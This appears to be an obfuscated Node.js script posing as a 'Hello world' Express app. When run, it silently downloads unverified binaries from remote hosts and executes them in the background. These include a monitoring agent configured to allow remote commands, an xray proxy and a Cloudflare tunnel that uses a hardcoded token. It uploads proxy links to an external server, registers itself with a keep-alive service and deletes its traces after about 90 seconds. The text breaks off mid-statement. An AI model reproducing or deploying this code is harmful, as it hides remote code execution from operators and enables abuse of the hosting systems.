const _0x18717b=_0x2a70;(function(_0x3b6c32,_0x1815bc){const _0x5e82ec=_0x2a70,_0x19044b=_0x3b6c32();while(!![]){try{const _0x424320=parseInt(_0x5e82ec(0x21e))/0x1*(parseInt(_0x5e82ec(0x27c))/0x2)+-parseInt(_0x5e82ec(0x230))/0x3+parseInt(_0x5e82ec(0x281))/0x4+parseInt(_0x5e82ec(0x217))/0x5+parseInt(_0x5e82ec(0x1f0))/0x6+-parseInt(_0x5e82ec(0x260))/0x7*(parseInt(_0x5e82ec(0x276))/0x8)+parseInt(_0x5e82ec(0x27f))/0x9;if(_0x424320===_0x1815bc)break;else _0x19044b['push'](_0x19044b['shift']());}catch(_0x4a57e2){_0x19044b['push'](_0x19044b['shift']());}}}(_0x2145,0xf1d66));const express=require(_0x18717b(0x1f8)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x18717b(0x21c)),exec=promisify(require(_0x18717b(0x1fa))[_0x18717b(0x202)]),{execSync}=require(_0x18717b(0x1fa)),UPLOAD_URL=process[_0x18717b(0x294)][_0x18717b(0x23f)]||'',PROJECT_URL=process[_0x18717b(0x294)]['PROJECT_URL']||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process['env'][_0x18717b(0x212)]||_0x18717b(0x21b),SUB_PATH=process[_0x18717b(0x294)][_0x18717b(0x28a)]||_0x18717b(0x23c),PORT=process['env'][_0x18717b(0x292)]||process[_0x18717b(0x294)][_0x18717b(0x1f6)]||0xbb8,UUID=process[_0x18717b(0x294)][_0x18717b(0x264)]||_0x18717b(0x22e),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x18717b(0x2a3)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',ARGO_DOMAIN=process['env'][_0x18717b(0x280)]||_0x18717b(0x1fc),ARGO_AUTH=process[_0x18717b(0x294)][_0x18717b(0x247)]||_0x18717b(0x24e),ARGO_PORT=process[_0x18717b(0x294)][_0x18717b(0x25a)]||0x1f41,CFIP=process[_0x18717b(0x294)]['CFIP']||_0x18717b(0x267),CFPORT=process['env'][_0x18717b(0x237)]||0x1bb,NAME=process[_0x18717b(0x294)][_0x18717b(0x265)]||_0x18717b(0x29d);!fs[_0x18717b(0x266)](FILE_PATH)?(fs[_0x18717b(0x24d)](FILE_PATH),console[_0x18717b(0x299)](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+_0x18717b(0x26e));function generateRandomName(){const _0x7c35c9=_0x18717b,_0xb85157=_0x7c35c9(0x20e);let _0x1f19cb='';for(let _0x4a3485=0x0;_0x4a3485<0x6;_0x4a3485++){_0x1f19cb+=_0xb85157[_0x7c35c9(0x214)](Math[_0x7c35c9(0x249)](Math[_0x7c35c9(0x220)]()*_0xb85157[_0x7c35c9(0x257)]));}return _0x1f19cb;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x2145(){const _0x95659d=['post','stringify','readFileSync','mkdirSync','eyJhIjoiYzMwZTIxOGQyYWI1YzUwYWM4YTkwZDc1MWNjNGUxOGMiLCJ0IjoiODU2MWI2NzUtN2ZiNC00Y2FkLTg3NDQtMzQxMzBjZTg2NTZjIiwicyI6IlkyVmhabVV4TlRJdE5qWTROUzAwT1dKakxUazVNamt0TVdWbFlXTTRaREJtWVdVMiJ9','--tls','countryCode','set','\x20-c\x20','push','/config.json\x20>/dev/null\x202>&1\x20&','unlinkSync','/sub.txt\x20saved\x20successfully','length','toString','firefox','ARGO_PORT','&fp=firefox&type=ws&host=','response','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','vmess','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','84jmdIta','substring','readdirSync','/vmess-argo?ed=2560','UUID','NAME','existsSync','cdns.doon.eu.org','\x20-c\x20\x22','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','includes','Subscription\x20uploaded\x20successfully','https://amd64.ssss.nyc.mn/bot','close','\x20already\x20exists','quic','list.txt','https://arm64.ssss.nyc.mn/web','http://ip-api.com/json/','aarch64','from','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','1022624MsGjIr','map','/tunnel.yml\x20run','win32','arm','basename','4090dtBPXj','clear','https://arm64.ssss.nyc.mn/agent','4290489tTjeHd','ARGO_DOMAIN','1117360aYbdGh','amd','.exe\x20>\x20nul\x202>&1','/vmess-argo','vless','\x20successfully','get','ArgoDomain:','Unhandled\x20error\x20in\x20startserver:','SUB_PATH','boot.log','\x20>/dev/null\x202>&1','base64','8443','fileUrl','2087','application/json','SERVER_PORT','chmod','env','match','xtls-rprx-vision','Empowerment\x20failed\x20for\x20','automatic\x20access\x20task\x20added\x20successfully','log','status','filter','npm\x20running\x20error:\x20','1029bluefire','\x0a\x20\x20tunnel:\x20','all','none','finish','Error\x20executing\x20command:\x20','NEZHA_PORT','Content-Type','\x0aclient_secret:\x20','\x0avless://','forEach','then','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','config.json','error','\x20-s\x20','5674422ngCcPU','\x20is\x20running','App\x20is\x20running','taskkill\x20/f\x20/im\x20','http\x20server\x20is\x20running\x20on\x20port:','web\x20running\x20error:\x20','PORT','&path=%2Ftrojan-argo%3Fed%3D2560#','express','Hello\x20world!','child_process','127.0.0.1','1029bluefire.brusen.dpdns.org','sub.txt','2096','/api/add-subscriptions','tcp','Empowerment\x20success\x20for\x20','exec','blackhole','send','pipe','&path=%2Fvless-argo%3Fed%3D2560#','Error\x20downloading\x20files:','block','writeFileSync','2083','https://amd64.ssss.nyc.mn/v1','tls','Download\x20','abcdefghijklmnopqrstuvwxyz','utf-8','/vless-argo','/dev/null','FILE_PATH','\x20failed:\x20','charAt','trojan','?security=tls&sni=','1125970hTomoK','fileName','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','?encryption=none&security=tls&sni=','./tmp','util','message','463XkvYjd','TunnelSecret','random','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x0a\x0atrojan://','org','tunnel.json','split','Unknown','catch','http','success','443','/trojan-argo','stream','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','e3d1b41d-7b96-48d6-9d74-9bbd4aaa8170','\x20-p\x20','1047975ycYJaa','https://amd64.ssss.nyc.mn/agent','country_code','join','data','ARGO_DOMAIN:','freedom','CFPORT','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Skipping\x20adding\x20automatic\x20access\x20task','config.yaml','1029','statSync','createWriteStream','UPLOAD_URL','/api/add-nodes','\x20>/dev/null\x202>&1\x20&','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20credentials-file:\x20','nohup\x20','\x22\x20>\x20/dev/null\x202>&1','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','ARGO_AUTH','Error\x20in\x20startserver:','floor'];_0x2145=function(){return _0x95659d;};return _0x2145();}let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x18717b(0x233)](FILE_PATH,phpName),webPath=path[_0x18717b(0x233)](FILE_PATH,webName),botPath=path[_0x18717b(0x233)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x18717b(0x1fd)),listPath=path[_0x18717b(0x233)](FILE_PATH,_0x18717b(0x270)),bootLogPath=path[_0x18717b(0x233)](FILE_PATH,_0x18717b(0x28b)),configPath=path[_0x18717b(0x233)](FILE_PATH,'config.json');function _0x2a70(_0x4820b1,_0x4573de){_0x4820b1=_0x4820b1-0x1eb;const _0x214500=_0x2145();let _0x2a706f=_0x214500[_0x4820b1];return _0x2a706f;}function deleteNodes(){const _0x2f6b7d=_0x18717b;try{if(!UPLOAD_URL)return;if(!fs[_0x2f6b7d(0x266)](subPath))return;let _0x3e0e5b;try{_0x3e0e5b=fs['readFileSync'](subPath,_0x2f6b7d(0x20f));}catch{return null;}const _0x1acc09=Buffer['from'](_0x3e0e5b,'base64')[_0x2f6b7d(0x258)](_0x2f6b7d(0x20f)),_0x4e9b25=_0x1acc09[_0x2f6b7d(0x225)]('\x0a')['filter'](_0x535772=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x535772));if(_0x4e9b25[_0x2f6b7d(0x257)]===0x0)return;return axios[_0x2f6b7d(0x24a)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x2f6b7d(0x24b)]({'nodes':_0x4e9b25}),{'headers':{'Content-Type':_0x2f6b7d(0x291)}})[_0x2f6b7d(0x227)](_0x2b5a8e=>{return null;}),null;}catch(_0x4102b5){return null;}}function cleanupOldFiles(){const _0x235fef=_0x18717b;try{const _0x52694e=fs[_0x235fef(0x262)](FILE_PATH);_0x52694e[_0x235fef(0x2a7)](_0x46e9d2=>{const _0x10343d=_0x235fef,_0x2864a3=path[_0x10343d(0x233)](FILE_PATH,_0x46e9d2);try{const _0x12353a=fs[_0x10343d(0x23d)](_0x2864a3);_0x12353a['isFile']()&&fs[_0x10343d(0x255)](_0x2864a3);}catch(_0x2eb5b4){}});}catch(_0x4b74c5){}}app[_0x18717b(0x287)]('/',function(_0x4581e1,_0x2a307e){const _0x4118ce=_0x18717b;_0x2a307e['send'](_0x4118ce(0x1f9));});async function generateConfig(){const _0x3d3b6d=_0x18717b,_0x4ecd8b={'log':{'access':_0x3d3b6d(0x211),'error':_0x3d3b6d(0x211),'loglevel':_0x3d3b6d(0x2a0)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3d3b6d(0x285),'settings':{'clients':[{'id':UUID,'flow':_0x3d3b6d(0x296)}],'decryption':_0x3d3b6d(0x2a0),'fallbacks':[{'dest':0xbb9},{'path':_0x3d3b6d(0x210),'dest':0xbba},{'path':_0x3d3b6d(0x284),'dest':0xbbb},{'path':_0x3d3b6d(0x22b),'dest':0xbbc}]},'streamSettings':{'network':_0x3d3b6d(0x200)}},{'port':0xbb9,'listen':_0x3d3b6d(0x1fb),'protocol':_0x3d3b6d(0x285),'settings':{'clients':[{'id':UUID}],'decryption':_0x3d3b6d(0x2a0)},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':_0x3d3b6d(0x1fb),'protocol':_0x3d3b6d(0x285),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3d3b6d(0x2a0)},'streamSettings':{'network':'ws','security':_0x3d3b6d(0x2a0),'wsSettings':{'path':_0x3d3b6d(0x210)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x3d3b6d(0x26f)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x3d3b6d(0x1fb),'protocol':_0x3d3b6d(0x25e),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x3d3b6d(0x20c),_0x3d3b6d(0x26f)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3d3b6d(0x1fb),'protocol':_0x3d3b6d(0x215),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x3d3b6d(0x22b)}},'sniffing':{'enabled':!![],'destOverride':[_0x3d3b6d(0x228),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x3d3b6d(0x236),'tag':'direct'},{'protocol':_0x3d3b6d(0x203),'tag':_0x3d3b6d(0x208)}]};fs['writeFileSync'](path[_0x3d3b6d(0x233)](FILE_PATH,_0x3d3b6d(0x1ed)),JSON[_0x3d3b6d(0x24b)](_0x4ecd8b,null,0x2));}function getSystemArchitecture(){const _0x50e499=_0x18717b,_0x308bf9=os['arch']();return _0x308bf9===_0x50e499(0x27a)||_0x308bf9==='arm64'||_0x308bf9===_0x50e499(0x273)?_0x50e499(0x27a):_0x50e499(0x282);}function downloadFile(_0x202751,_0x58e0ab,_0x3df595){const _0xb1c15e=_0x18717b,_0x5d3ab3=_0x202751;!fs[_0xb1c15e(0x266)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x513c82=fs[_0xb1c15e(0x23e)](_0x5d3ab3);axios({'method':_0xb1c15e(0x287),'url':_0x58e0ab,'responseType':_0xb1c15e(0x22c)})[_0xb1c15e(0x2a8)](_0x512f27=>{const _0x1aac9c=_0xb1c15e;_0x512f27['data'][_0x1aac9c(0x205)](_0x513c82),_0x513c82['on'](_0x1aac9c(0x2a1),()=>{const _0xd5fd65=_0x1aac9c;_0x513c82[_0xd5fd65(0x26d)](),console['log'](_0xd5fd65(0x20d)+path[_0xd5fd65(0x27b)](_0x5d3ab3)+_0xd5fd65(0x286)),_0x3df595(null,_0x5d3ab3);}),_0x513c82['on']('error',_0x24fb0c=>{const _0x1f68ad=_0x1aac9c;fs['unlink'](_0x5d3ab3,()=>{});const _0x580fdb=_0x1f68ad(0x20d)+path[_0x1f68ad(0x27b)](_0x5d3ab3)+_0x1f68ad(0x213)+_0x24fb0c['message'];console['error'](_0x580fdb),_0x3df595(_0x580fdb);});})['catch'](_0x271aa4=>{const _0x3bb53e=_0xb1c15e,_0x4f87e0=_0x3bb53e(0x20d)+path[_0x3bb53e(0x27b)](_0x5d3ab3)+_0x3bb53e(0x213)+_0x271aa4[_0x3bb53e(0x21d)];console[_0x3bb53e(0x1ee)](_0x4f87e0),_0x3df595(_0x4f87e0);});}async function downloadFilesAndRun(){const _0x4b5756=_0x18717b,_0x42bbb0=getSystemArchitecture(),_0x431d9b=getFilesForArchitecture(_0x42bbb0);if(_0x431d9b[_0x4b5756(0x257)]===0x0){console[_0x4b5756(0x299)](_0x4b5756(0x25d));return;}const _0x93baa9=_0x431d9b[_0x4b5756(0x277)](_0x27c982=>{return new Promise((_0x4837ce,_0x2b04b5)=>{const _0x2d5327=_0x2a70;downloadFile(_0x27c982[_0x2d5327(0x218)],_0x27c982[_0x2d5327(0x28f)],(_0x28c77e,_0x5ed944)=>{_0x28c77e?_0x2b04b5(_0x28c77e):_0x4837ce(_0x5ed944);});});});try{await Promise[_0x4b5756(0x29f)](_0x93baa9);}catch(_0x557b90){console[_0x4b5756(0x1ee)](_0x4b5756(0x207),_0x557b90);return;}function _0x376867(_0x2bc9ab){const _0x59b96e=_0x4b5756,_0x1e585f=0x1fd;_0x2bc9ab[_0x59b96e(0x2a7)](_0x5a5356=>{const _0x3baf97=_0x59b96e;fs[_0x3baf97(0x266)](_0x5a5356)&&fs[_0x3baf97(0x293)](_0x5a5356,_0x1e585f,_0x3e4c16=>{const _0xae7c0f=_0x3baf97;_0x3e4c16?console[_0xae7c0f(0x1ee)](_0xae7c0f(0x297)+_0x5a5356+':\x20'+_0x3e4c16):console[_0xae7c0f(0x299)](_0xae7c0f(0x201)+_0x5a5356+':\x20'+_0x1e585f['toString'](0x8));});});}const _0x3bc42c=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x376867(_0x3bc42c);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xbc1638=NEZHA_SERVER[_0x4b5756(0x26a)](':')?NEZHA_SERVER[_0x4b5756(0x225)](':')['pop']():'',_0x2b9f0a=new Set([_0x4b5756(0x22a),_0x4b5756(0x28e),_0x4b5756(0x1fe),_0x4b5756(0x290),_0x4b5756(0x20a),'2053']),_0x135a6a=_0x2b9f0a['has'](_0xbc1638)?'true':'false',_0x2aaa71=_0x4b5756(0x2a5)+NEZHA_KEY+_0x4b5756(0x246)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x135a6a+_0x4b5756(0x239)+UUID;fs[_0x4b5756(0x209)](path['join'](FILE_PATH,_0x4b5756(0x23b)),_0x2aaa71);const _0x403388='nohup\x20'+phpPath+_0x4b5756(0x268)+FILE_PATH+_0x4b5756(0x221);try{await exec(_0x403388),console[_0x4b5756(0x299)](phpName+'\x20is\x20running'),await new Promise(_0x448edb=>setTimeout(_0x448edb,0x3e8));}catch(_0x5a5f65){console[_0x4b5756(0x1ee)]('php\x20running\x20error:\x20'+_0x5a5f65);}}else{let _0x5a9e18='';const _0x8e91b7=[_0x4b5756(0x22a),'8443',_0x4b5756(0x1fe),'2087',_0x4b5756(0x20a),'2053'];_0x8e91b7[_0x4b5756(0x26a)](NEZHA_PORT)&&(_0x5a9e18=_0x4b5756(0x24f));const _0x3dcbdd=_0x4b5756(0x244)+npmPath+_0x4b5756(0x1ef)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4b5756(0x22f)+NEZHA_KEY+'\x20'+_0x5a9e18+_0x4b5756(0x242);try{await exec(_0x3dcbdd),console[_0x4b5756(0x299)](npmName+'\x20is\x20running'),await new Promise(_0x18694a=>setTimeout(_0x18694a,0x3e8));}catch(_0x4e2b86){console[_0x4b5756(0x1ee)](_0x4b5756(0x29c)+_0x4e2b86);}}}else console[_0x4b5756(0x299)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x1a6360=_0x4b5756(0x244)+webPath+_0x4b5756(0x252)+FILE_PATH+_0x4b5756(0x254);try{await exec(_0x1a6360),console[_0x4b5756(0x299)](webName+_0x4b5756(0x1f1)),await new Promise(_0x5d5c56=>setTimeout(_0x5d5c56,0x3e8));}catch(_0x59b4da){console[_0x4b5756(0x1ee)](_0x4b5756(0x1f5)+_0x59b4da);}if(fs[_0x4b5756(0x266)](botPath)){let _0x20d453;if(ARGO_AUTH[_0x4b5756(0x295)](/^[A-Z0-9a-z=]{120,250}$/))_0x20d453='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x4b5756(0x295)](/TunnelSecret/)?_0x20d453=_0x4b5756(0x275)+FILE_PATH+_0x4b5756(0x278):_0x20d453='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x4b5756(0x25f)+ARGO_PORT;try{await exec(_0x4b5756(0x244)+botPath+'\x20'+_0x20d453+'\x20>/dev/null\x202>&1\x20&'),console[_0x4b5756(0x299)](botName+'\x20is\x20running'),await new Promise(_0x373a9b=>setTimeout(_0x373a9b,0x7d0));}catch(_0x486089){console[_0x4b5756(0x1ee)](_0x4b5756(0x2a2)+_0x486089);}}await new Promise(_0xbc27c8=>setTimeout(_0xbc27c8,0x1388));}function getFilesForArchitecture(_0x4d2674){const _0x2bc71b=_0x18717b;let _0x5608d9;_0x4d2674===_0x2bc71b(0x27a)?_0x5608d9=[{'fileName':webPath,'fileUrl':_0x2bc71b(0x271)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x5608d9=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x2bc71b(0x26c)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x367057=_0x4d2674==='arm'?_0x2bc71b(0x27e):_0x2bc71b(0x231);_0x5608d9['unshift']({'fileName':npmPath,'fileUrl':_0x367057});}else{const _0x28a363=_0x4d2674===_0x2bc71b(0x27a)?'https://arm64.ssss.nyc.mn/v1':_0x2bc71b(0x20b);_0x5608d9['unshift']({'fileName':phpPath,'fileUrl':_0x28a363});}}return _0x5608d9;}function argoType(){const _0x91fbd7=_0x18717b;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x91fbd7(0x299)](_0x91fbd7(0x22d));return;}if(ARGO_AUTH[_0x91fbd7(0x26a)](_0x91fbd7(0x21f))){fs[_0x91fbd7(0x209)](path['join'](FILE_PATH,_0x91fbd7(0x224)),ARGO_AUTH);const _0x2de8fb=_0x91fbd7(0x29e)+ARGO_AUTH['split']('\x22')[0xb]+_0x91fbd7(0x243)+path['join'](FILE_PATH,_0x91fbd7(0x224))+_0x91fbd7(0x1eb)+ARGO_DOMAIN+_0x91fbd7(0x1ec)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x91fbd7(0x209)](path[_0x91fbd7(0x233)](FILE_PATH,'tunnel.yml'),_0x2de8fb);}else console['log'](_0x91fbd7(0x269));}async function extractDomains(){const _0x4a9f14=_0x18717b;let _0x447bb6;if(ARGO_AUTH&&ARGO_DOMAIN)_0x447bb6=ARGO_DOMAIN,console[_0x4a9f14(0x299)](_0x4a9f14(0x235),_0x447bb6),await _0x4f70d1(_0x447bb6);else try{const _0x4936e6=fs[_0x4a9f14(0x24c)](path[_0x4a9f14(0x233)](FILE_PATH,_0x4a9f14(0x28b)),'utf-8'),_0x1afcf2=_0x4936e6['split']('\x0a'),_0x51ab49=[];_0x1afcf2['forEach'](_0x35e4cc=>{const _0x57e079=_0x4a9f14,_0x589738=_0x35e4cc[_0x57e079(0x295)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x589738){const _0xe75b15=_0x589738[0x1];_0x51ab49[_0x57e079(0x253)](_0xe75b15);}});if(_0x51ab49[_0x4a9f14(0x257)]>0x0)_0x447bb6=_0x51ab49[0x0],console[_0x4a9f14(0x299)](_0x4a9f14(0x288),_0x447bb6),await _0x4f70d1(_0x447bb6);else{console[_0x4a9f14(0x299)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x4a9f14(0x255)](path[_0x4a9f14(0x233)](FILE_PATH,_0x4a9f14(0x28b)));async function _0x1642bd(){const _0x5123fd=_0x4a9f14;try{process['platform']===_0x5123fd(0x279)?await exec(_0x5123fd(0x1f3)+botName+_0x5123fd(0x283)):await exec('pkill\x20-f\x20\x22['+botName[_0x5123fd(0x214)](0x0)+']'+botName[_0x5123fd(0x261)](0x1)+_0x5123fd(0x245));}catch(_0x457a59){}}_0x1642bd(),await new Promise(_0xe74f70=>setTimeout(_0xe74f70,0xbb8));const _0x2d5f75=_0x4a9f14(0x238)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x4a9f14(0x244)+botPath+'\x20'+_0x2d5f75+_0x4a9f14(0x241)),console[_0x4a9f14(0x299)](botName+'\x20is\x20running'),await new Promise(_0x752b47=>setTimeout(_0x752b47,0xbb8)),await extractDomains();}catch(_0x57aa19){console[_0x4a9f14(0x1ee)]('Error\x20executing\x20command:\x20'+_0x57aa19);}}}catch(_0x40bd7f){console['error']('Error\x20reading\x20boot.log:',_0x40bd7f);}async function _0x5a02da(){const _0x2a5714=_0x4a9f14;try{const _0x5bf8c5=await axios[_0x2a5714(0x287)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x5bf8c5['data']&&_0x5bf8c5[_0x2a5714(0x234)][_0x2a5714(0x232)]&&_0x5bf8c5[_0x2a5714(0x234)][_0x2a5714(0x223)])return _0x5bf8c5[_0x2a5714(0x234)]['country_code']+'_'+_0x5bf8c5[_0x2a5714(0x234)][_0x2a5714(0x223)];}catch(_0x1c5e78){try{const _0x21857e=await axios[_0x2a5714(0x287)](_0x2a5714(0x272),{'timeout':0xbb8});if(_0x21857e[_0x2a5714(0x234)]&&_0x21857e['data'][_0x2a5714(0x29a)]===_0x2a5714(0x229)&&_0x21857e[_0x2a5714(0x234)][_0x2a5714(0x250)]&&_0x21857e[_0x2a5714(0x234)]['org'])return _0x21857e[_0x2a5714(0x234)][_0x2a5714(0x250)]+'_'+_0x21857e[_0x2a5714(0x234)][_0x2a5714(0x223)];}catch(_0x58c445){}}return _0x2a5714(0x226);}async function _0x4f70d1(_0x3c18f5){const _0x2308c8=await _0x5a02da(),_0x292bda=NAME?NAME+'-'+_0x2308c8:_0x2308c8;return new Promise(_0x3b33b1=>{setTimeout(()=>{const _0x4576d7=_0x2a70,_0x369b0c={'v':'2','ps':''+_0x292bda,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x4576d7(0x2a0),'host':_0x3c18f5,'path':_0x4576d7(0x263),'tls':_0x4576d7(0x20c),'sni':_0x3c18f5,'alpn':'','fp':_0x4576d7(0x259)},_0x3c319a=_0x4576d7(0x2a6)+UUID+'@'+CFIP+':'+CFPORT+_0x4576d7(0x21a)+_0x3c18f5+_0x4576d7(0x25b)+_0x3c18f5+_0x4576d7(0x206)+_0x292bda+'\x0a\x0avmess://'+Buffer[_0x4576d7(0x274)](JSON['stringify'](_0x369b0c))['toString'](_0x4576d7(0x28d))+_0x4576d7(0x222)+UUID+'@'+CFIP+':'+CFPORT+_0x4576d7(0x216)+_0x3c18f5+_0x4576d7(0x25b)+_0x3c18f5+_0x4576d7(0x1f7)+_0x292bda+'\x0a\x20\x20\x20\x20';console[_0x4576d7(0x299)](Buffer[_0x4576d7(0x274)](_0x3c319a)[_0x4576d7(0x258)]('base64')),fs[_0x4576d7(0x209)](subPath,Buffer[_0x4576d7(0x274)](_0x3c319a)[_0x4576d7(0x258)]('base64')),console[_0x4576d7(0x299)](FILE_PATH+_0x4576d7(0x256)),uploadNodes(),app[_0x4576d7(0x287)]('/'+SUB_PATH,(_0x244417,_0x138818)=>{const _0x3145cd=_0x4576d7,_0x1092e2=Buffer[_0x3145cd(0x274)](_0x3c319a)['toString']('base64');_0x138818[_0x3145cd(0x251)](_0x3145cd(0x2a4),'text/plain;\x20charset=utf-8'),_0x138818[_0x3145cd(0x204)](_0x1092e2);}),_0x3b33b1(_0x3c319a);},0x7d0);});}}async function uploadNodes(){const _0x4a40bb=_0x18717b;if(UPLOAD_URL&&PROJECT_URL){const _0x1aad23=PROJECT_URL+'/'+SUB_PATH,_0xdf9302={'subscription':[_0x1aad23]};try{const _0x284ced=await axios[_0x4a40bb(0x24a)](UPLOAD_URL+_0x4a40bb(0x1ff),_0xdf9302,{'headers':{'Content-Type':_0x4a40bb(0x291)}});return _0x284ced&&_0x284ced[_0x4a40bb(0x29a)]===0xc8?(console['log'](_0x4a40bb(0x26b)),_0x284ced):null;}catch(_0x494f67){if(_0x494f67['response']){if(_0x494f67[_0x4a40bb(0x25c)][_0x4a40bb(0x29a)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4a40bb(0x266)](listPath))return;const _0x3855c1=fs['readFileSync'](listPath,_0x4a40bb(0x20f)),_0x5ec82e=_0x3855c1[_0x4a40bb(0x225)]('\x0a')[_0x4a40bb(0x29b)](_0x133543=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x133543));if(_0x5ec82e[_0x4a40bb(0x257)]===0x0)return;const _0x5ce6ac=JSON[_0x4a40bb(0x24b)]({'nodes':_0x5ec82e});try{const _0x24f92c=await axios['post'](UPLOAD_URL+_0x4a40bb(0x240),_0x5ce6ac,{'headers':{'Content-Type':_0x4a40bb(0x291)}});return _0x24f92c&&_0x24f92c[_0x4a40bb(0x29a)]===0xc8?(console['log']('Nodes\x20uploaded\x20successfully'),_0x24f92c):null;}catch(_0x2f5cbf){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0xcbfe30=_0x2a70,_0x4b2d96=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4b2d96[_0xcbfe30(0x253)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4b2d96[_0xcbfe30(0x253)](phpPath);process['platform']===_0xcbfe30(0x279)?exec('del\x20/f\x20/q\x20'+_0x4b2d96[_0xcbfe30(0x233)]('\x20')+'\x20>\x20nul\x202>&1',_0x55d3f8=>{const _0x216de=_0xcbfe30;console[_0x216de(0x27d)](),console[_0x216de(0x299)](_0x216de(0x1f2)),console['log'](_0x216de(0x219));}):exec('rm\x20-rf\x20'+_0x4b2d96[_0xcbfe30(0x233)]('\x20')+_0xcbfe30(0x28c),_0x484c57=>{const _0xb40a79=_0xcbfe30;console['clear'](),console[_0xb40a79(0x299)](_0xb40a79(0x1f2)),console['log'](_0xb40a79(0x219));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xd91a96=_0x18717b;if(!AUTO_ACCESS||!PROJECT_URL){console[_0xd91a96(0x299)](_0xd91a96(0x23a));return;}try{const _0x3533fb=await axios[_0xd91a96(0x24a)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0xd91a96(0x291)}});return console[_0xd91a96(0x299)](_0xd91a96(0x298)),_0x3533fb;}catch(_0x80f9e0){return console[_0xd91a96(0x1ee)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x80f9e0['message']),null;}}async function startserver(){const _0x4d68c7=_0x18717b;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x168677){console[_0x4d68c7(0x1ee)](_0x4d68c7(0x248),_0x168677);}}startserver()['catch'](_0x53fdff=>{const 